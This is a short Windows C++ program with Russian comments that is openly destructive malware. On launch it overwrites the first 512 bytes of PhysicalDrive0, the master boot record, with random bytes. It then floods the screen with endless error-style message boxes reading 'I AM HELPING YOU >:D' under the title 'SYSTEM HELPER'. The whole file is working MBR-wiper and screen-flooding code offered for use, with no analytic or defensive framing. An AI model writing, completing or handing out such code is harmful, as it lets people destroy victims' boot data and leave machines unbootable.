#include <windows.h>
#include <thread>
#include <chrono>

// Ссылка на функцию сноса MBR
void DestroyMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE garbage[512];
        for (int i = 0; i < 512; i++) garbage[i] = rand() % 256;
        DWORD written;
        WriteFile(hDevice, garbage, 512, &written, NULL);
        CloseHandle(hDevice);
    }
}

// Поток, который спамит окнами
void WindowSpam() {
    while (true) {
        // Создаем окно в отдельном потоке, чтобы не блокировать спам
        std::thread([]() {
            MessageBoxA(NULL, "I AM HELPING YOU >:D", "SYSTEM HELPER", MB_OK | MB_ICONERROR);
        }).detach();
        Sleep(50); // Задержка, чтобы окна успевали появляться
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand(GetTickCount());

    // 1. Сносим MBR в фоне
    std::thread(DestroyMBR).detach();

    // 2. Запускаем бесконечный спам окнами
    WindowSpam();

    return 0;
}
